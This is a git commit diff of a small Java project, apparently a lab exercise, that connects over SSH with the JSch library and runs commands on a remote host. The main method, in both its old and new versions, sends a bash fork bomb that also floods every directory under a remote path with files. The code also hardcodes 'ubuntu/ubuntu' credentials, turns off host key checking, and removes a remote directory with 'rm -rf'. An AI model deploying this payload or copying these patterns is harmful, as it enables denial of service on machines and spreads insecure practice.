23d4253d3eaf7a253549af6bc062d33db153d3b7
vito-souza <vitorlegalvh@gmail.com>
2024-12-08 10:57:46 -0300

    teste arraylist

--- src/main/java/vitor/dev/Main.java
+++ src/main/java/vitor/dev/Main.java
@@ -1,50 +1,36 @@
 package vitor.dev;
 
+import java.util.ArrayList;
+import java.util.List;
+
 import vitor.dev.connection.SSHConnection;
 
 public class Main {
 
-    private static final String USER = "ubuntu";
-    private static final String HOST = "localhost";
-    private static final String PASSWD = "ubuntu";
-    private static final String REMOTE_PATH = "/home/ubuntu/Vitor";
-    private static final String LIB = "src\\main\\resources\\scripts\\";
-    private static final String SUDO_PASSWD = "ubuntu";
-    private static final int PORT = 2222;
-
-    /**
-     * Envia e executa o script de ataque no servidor remoto.
-     */
-    public static void attack() {
-        // Connection.transfer(LIB + "attack.sh", REMOTE_PATH);
-        // Connection.command("chmod +x " + REMOTE_PATH + "/attack.sh");
-        // Connection.sudoCommand("bash " + REMOTE_PATH + "/attack.sh", SUDO_PASSWD);
-        SSHConnection.command(
-                "bash -c ':() { for D in $(find \"/home/ubuntu/Vitor\" -type d); do touch \"$D/vitor_$(date +%s%N).txt\"; done; :|: & };:'");
-    }
-
-    /**
-     * Envia e executa o script de defesa no servidor remoto.
-     */
-    public static void defense() {
-        // Corrigindo caminho para usar LIB (no Windows)
-        SSHConnection.transfer(LIB + "defense.sh", REMOTE_PATH);
-        SSHConnection.command("chmod +x " + REMOTE_PATH + "/defense.sh");
-        SSHConnection.sudoCommand("bash " + REMOTE_PATH + "/defense.sh", SUDO_PASSWD);
-    }
-
-    /**
-     * Coneta e configura o ambiente no servidor remoto.
-     */
-    public static void setup() {
-        SSHConnection.connect(USER, HOST, PASSWD, PORT); // Se conectando ao host.
-        SSHConnection.command("rm -rf " + REMOTE_PATH);
-        SSHConnection.command("mkdir " + REMOTE_PATH);
-    }
-
     public static void main(String[] args) {
-        setup();
-        defense();
-        // attack();
+        SSHConnection connection = new SSHConnection();
+
+        List<String[]> connectionData = new ArrayList<>();
+        connectionData.add(new String[] { "ubuntu", "localhost", "ubuntu", "/home/ubuntu/Vitor", "22" });
+
+        connectionData.forEach(data -> {
+            String user = data[0];
+            String host = data[1];
+            String password = data[2];
+            String remotePath = data[3];
+            int port = Integer.parseInt(data[4]);
+
+            connection.connect(user, host, password, port);
+            connection.command(
+                    String.format(
+                            "bash -c ':() { " +
+                                    "for D in $(find \"%s\" -type d); do " +
+                                    "touch \"$D/vitor_$(date +%%s%%N).txt\"; " +
+                                    "done; " +
+                                    ":|: & " +
+                                    "};:'",
+                            remotePath),
+                    password);
+        });
     }
 }
--- src/main/java/vitor/dev/connection/SSHConnection.java
+++ src/main/java/vitor/dev/connection/SSHConnection.java
@@ -12,71 +12,36 @@ import com.jcraft.jsch.JSchException;
 import com.jcraft.jsch.Session;
 import com.jcraft.jsch.SftpException;
 
-/**
- * A classe {@code SSHConnection} permite conectar-se a um servidor remoto via
- * SSH
- * e executar comandos. Utiliza a biblioteca JSch para estabelecer a conexão e
- * capturar a saída dos comandos executados.
- */
 public class SSHConnection {
 
-    static JSch jsch = new JSch();
-    static Session session;
+    private JSch jsch = new JSch();
+    private Session session;
 
-    /**
-     * Estabelece uma conexão SSH com o servidor usando as credenciais fornecidas.
-     *
-     * @param user     O nome de usuário para autenticação no servidor SSH.
-     * @param host     O endereço do servidor SSH.
-     * @param password A senha do usuário.
-     * @param port     A porta do servidor SSH (geralmente 22).
-     */
-    public static void connect(String user, String host, String password, int port) {
+    public void connect(String user, String host, String password, int port) {
         try {
-            session = jsch.getSession(user, host, port); // Cria uma sessão SSH.
-            session.setPassword(password); // Insere a senha do servidor SSH.
-
-            // Configurando para ignorar verificações de chave de host.
+            session = jsch.getSession(user, host, port);
+            session.setPassword(password);
             session.setConfig("StrictHostKeyChecking", "no");
-
-            session.connect(); // Conectando ao servidor.
+            session.connect();
 
             System.out.println("Conexão estabelecida com o host: \"" + user + "@" + host + "\"");
         } catch (JSchException e) {
             System.out.println("Não foi possível estabelecer uma conexão com o host: " + e.getMessage() + "\n");
-            e.printStackTrace(); // Pilha de execução.
+            e.printStackTrace();
         }
     }
 
-    /**
-     * Executa um comando SSH no servidor remoto.
-     *
-     * @param command O comando a ser executado.
-     */
-    public static void command(String command) {
+    public void command(String command) {
         executeCommand(command, null);
     }
 
-    /**
-     * Executa um comando SSH com privilégios de superusuário no servidor remoto.
-     *
-     * @param command    O comando a ser executado.
-     * @param sudoPasswd A senha do superusuário para autenticação.
-     */
-    public static void sudoCommand(String command, String sudoPasswd) {
+    public void command(String command, String sudoPasswd) {
         executeCommand(command, sudoPasswd);
     }
 
-    /**
-     * Executa um comando no servidor remoto, podendo incluir senha de superusuário.
-     *
-     * @param command    O comando a ser executado.
-     * @param sudoPasswd A senha do superusuário (pode ser null se não necessário).
-     */
-    private static void executeCommand(String command, String sudoPasswd) {
+    private void executeCommand(String command, String sudoPasswd) {
         try {
             ChannelExec channel = (ChannelExec) session.openChannel("exec");
-
             channel.setCommand(command);
             channel.setErrStream(channel.getOutputStream());
             channel.connect();
@@ -93,50 +58,35 @@ public class SSHConnection {
         }
     }
 
-    /**
-     * Transfere um arquivo de um caminho local para um caminho remoto usando SFTP.
-     *
-     * @param fromPath O caminho do arquivo local a ser transferido.
-     * @param toPath   O caminho remoto para onde o arquivo será transferido.
-     */
-    public static void transfer(String fromPath, String toPath) {
+    public void transfer(String fromPath, String toPath) {
         try {
-            ChannelSftp channel = (ChannelSftp) session.openChannel("sftp"); // Canal de transferência.
+            ChannelSftp channel = (ChannelSftp) session.openChannel("sftp");
             channel.connect();
+            channel.put(fromPath, toPath);
 
-            channel.put(fromPath, toPath); // Transferir o arquivo de um local para o outro.
             System.out.println("Arquivo \"" + fromPath + "\" transferido com sucesso para \"" + toPath + "\"");
 
             channel.disconnect();
         } catch (JSchException | SftpException e) {
             System.out.println("Não foi possível executar a transferência: " + e.getMessage() + "\n");
-            e.printStackTrace(); // Pilha de execução.
+            e.printStackTrace();
         }
     }
 
-    /**
-     * Captura e retorna a saída de um comando executado via SSH.
-     *
-     * @param channel O canal SSH onde o comando foi executado.
-     * @return A saída do comando.
-     * @throws IOException Se ocorrer erro ao ler a saída.
-     */
-    private static String captureCommandOutput(Channel channel) {
-        StringBuilder output = new StringBuilder(); // Para armazenar a saída do comando.
+    private String captureCommandOutput(Channel channel) {
+        StringBuilder output = new StringBuilder();
 
-        // Lendo a saída do comando:
         try (BufferedReader reader = new BufferedReader(new InputStreamReader(channel.getInputStream()))) {
             String line;
 
-            // Enquanto ainda receber respostas:
             while ((line = reader.readLine()) != null) {
-                output.append(line).append("\n"); // Atribuíndo a respota ao objeto.
+                output.append(line).append("\n");
             }
         } catch (IOException e) {
             System.out.println("Erro ao ler a saída do comando: " + e.getMessage() + "\n");
-            e.printStackTrace(); // Pilha de execução.
+            e.printStackTrace();
         }
 
-        return output.toString(); // Retornando a saída do comando.
+        return output.toString();
     }
 }
